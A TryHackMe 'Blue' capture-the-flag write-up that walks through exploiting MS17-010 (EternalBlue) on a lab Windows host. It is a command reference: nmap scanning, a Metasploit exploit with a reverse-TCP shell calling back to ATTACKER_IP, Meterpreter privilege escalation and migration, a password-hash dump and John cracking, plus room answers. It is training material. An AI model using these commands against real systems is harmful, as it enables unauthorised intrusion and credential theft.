---
link: https://tryhackme.com/room/blue
difficulty: Easy
description: Command-only reference — Windows host, SMBv1 / MS17-010 to SYSTEM, hash dump and offline crack.
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_try_hack_me_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Blue Writeup</p></div>

  <img src="https://cdn-images.tryhackme.com/room-icons/blue-1785241443587.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): ben, DarkStar7471</p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: 30 Aug 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->
# Blue — Command Reference

**Prerequisites:** `nmap`, `metasploit-framework` (msfconsole), `john` (or `hashcat` + an OpenCL/CUDA backend), `rockyou.txt` wordlist, `ifconfig` (net-tools) or `iproute2`, an active lab VPN connection.

## Placeholder legend

| Token | Where to get it |
| --- | --- |
| `TARGET_IP` | The lab machine's IP shown on the room page after **Start Lab Machine**. Changes every spawn. |
| `ATTACKER_IP` | Your VPN address — the `inet` value from `ifconfig tun0`. Changes on every VPN reconnect. |
| `<JON_NT_HASH>` | ⚠ Field 4 of Jon's line in `hashdump` output. Per-spawn. |
| `<SESSION_ID>` | ⚠ Session number from `sessions`. Assigned dynamically. |
| `<METERPRETER_SESSION_ID>` | ⚠ Session number of the upgraded session from `sessions`. |
| `<SYSTEM_PID>` | ⚠ PID of a SYSTEM-owned, x64, long-lived native service from `ps` (e.g. `spoolsv.exe`). Per-spawn. |

Box-design values left as-is: local username `Jon`, flag file paths.
Host does not respond to ICMP — always use `-Pn`.

---

## 1. Recon

```
nmap -p- --min-rate 5000 -Pn TARGET_IP
```

Version-scan only the distinct services. The 49152+ block is the dynamic RPC range already represented by port 135 — skip it.

```
nmap -A -Pn -p 135,139,445,3389,5985,47001 TARGET_IP
```

Q2 — open ports under 1000: **3** (135, 139, 445)

```
nmap -Pn -p 445 --script vuln TARGET_IP
```

Q3 — vulnerable to: **ms17-010**

---

## 2. Gain Access

```
msfconsole
```

Wait for the `msf >` prompt — the module index takes 10–30 s to load.

```
search ms17-010
```

Q5 — exploit path: `exploit/windows/smb/ms17_010_eternalblue`

```
use exploit/windows/smb/ms17_010_eternalblue
show options
```

Q6 — required option with no value: **RHOSTS**

Get your VPN address before setting `LHOST`. Metasploit auto-populates `LHOST` with a local virtualisation adapter address, which the target cannot reach — the exploit will report success and never deliver a session.

```
ifconfig tun0
```

Take the `inet` value — that is `ATTACKER_IP`. Re-run after any VPN reconnect.

```
set payload windows/x64/shell/reverse_tcp
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
show options
```

Verify against `show options`, not the `=>` confirmation lines — the confirmation echoes what you typed, not what was set.

```
exploit
```

You may have to press **Enter** for the DOS shell prompt to appear. If no session opens, re-run; EternalBlue corrupts kernel memory and occasionally needs a retry or a target reboot.

```
whoami
```

Runs on the target, not the attack box. The command echoes twice — normal for a raw `shell/reverse_tcp` payload.

Background the shell:

```
Ctrl+Z
```

Prompts `Background session ... ? [y/N]` — enter **y**. Returns to the `msf` prompt; the session stays alive.

---

## 3. Escalate

```
use post/multi/manage/shell_to_meterpreter
show options
```

Q10 — required option to change: **SESSION**

```
sessions
set SESSION <SESSION_ID>          ⚠ swap — from the sessions list
set LHOST ATTACKER_IP             ⚠ swap — tun0 address; auto-detect is unreliable over VPN
run
```

`Post module execution completed` prints *before* the new session opens. Press **Enter** if the prompt does not refresh. Running `run` twice creates a duplicate session; kill spares with `sessions -k <id>`.

```
sessions
sessions -i <METERPRETER_SESSION_ID>    ⚠ swap — the meterpreter session, not the shell
```

Prompt changes to `meterpreter >`.

```
getsystem
getuid
shell
whoami
Ctrl+Z
```

`getsystem` returning `[-] Already running as SYSTEM` is success, not failure. `Ctrl+Z` prompts for confirmation — enter **y**; it returns you to `meterpreter >`, not to msfconsole.

```
ps
```

Pick a migration target: `User` = `NT AUTHORITY\SYSTEM`, `Arch` = x64, session 0, long-lived native service. `spoolsv.exe` or `wininit.exe` are the textbook picks; bare SYSTEM `svchost.exe` entries also work. Avoid `lsass.exe`, anything in session 1, the `cmd.exe`/`conhost.exe`/`powershell.exe` cluster you spawned, and the box's custom binary.

```
migrate <SYSTEM_PID>              ⚠ swap — PID from your own ps output, not a value from any writeup
```

Migration is unstable; on failure re-run the shell_to_meterpreter conversion or reboot the box and pick a different PID.

---

## 4. Cracking

```
hashdump
```

Q17 — non-default user: **Jon** (RID 1002; RIDs 500/501 are built-in Administrator and Guest).

Line format is `username:RID:LMhash:NThash:::` — field 4 is the one to crack. `aad3b435b51404eeaad3b435b51404ee` in field 3 is the empty-LM placeholder, ignore it.

Run the next two on the attack box, in a separate terminal (or background meterpreter first):

```
echo '<JON_NT_HASH>' > jon.hash        ⚠ swap — Jon's NT hash from your hashdump
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jon.hash
```

`--format=nt` is required — without it John may misread a bare NT hash as LM and fail. If only `rockyou.txt.gz` is present, `gunzip` it first. Hashcat v7 fails here with `CL_PLATFORM_NOT_FOUND_KHR` on a VM with no OpenCL/CUDA/HIP backend, and `--force` does not fix it — use John.

Retrieve the result later with:

```
john --show --format=NT jon.hash
```

---

## 5. Final Flags

From `meterpreter >`:

```
shell
```

```
dir C:\ /b
type C:\flag1.txt
```

```
dir C:\Windows\System32\config /b
type C:\Windows\System32\config\flag2.txt
```

Flag 2 is occasionally deleted by Windows — if it is missing, terminate/restart the machine and re-run the exploit.

```
dir C:\Users\Jon\Documents /b
type C:\Users\Jon\Documents\flag3.txt
```

---

## Fill-in table (per-spawn values)

| Token | Source command | Your value |
| --- | --- | --- |
| `TARGET_IP` | Room page / **Start Lab Machine** | |
| `ATTACKER_IP` | `ifconfig tun0` → `inet` | |
| `<SESSION_ID>` | `sessions` (the `shell x64/windows` row) | |
| `<METERPRETER_SESSION_ID>` | `sessions` (the `meterpreter x64/windows` row) | |
| `<SYSTEM_PID>` | `ps` (SYSTEM / x64 / session 0 service) | |
| `<JON_NT_HASH>` | `hashdump` → Jon's line, field 4 | |
| Jon's password | `john ... jon.hash` | |

---

## Terminal / host map

| Prompt | Runs on | Command set |
| --- | --- | --- |
| `┌──(user㉿kali)-[~]` | Attack box | `nmap`, `msfconsole`, `john`, `ifconfig` |
| `msf >` / `msf exploit(...) >` | Attack box (framework) | `use`, `set`, `show options`, `run`, `sessions` |
| `C:\...>` | Target | Windows built-ins: `whoami`, `dir`, `type` |
| `meterpreter >` | Target (in-memory agent) | `getuid`, `getsystem`, `ps`, `migrate`, `hashdump`, `shell` |
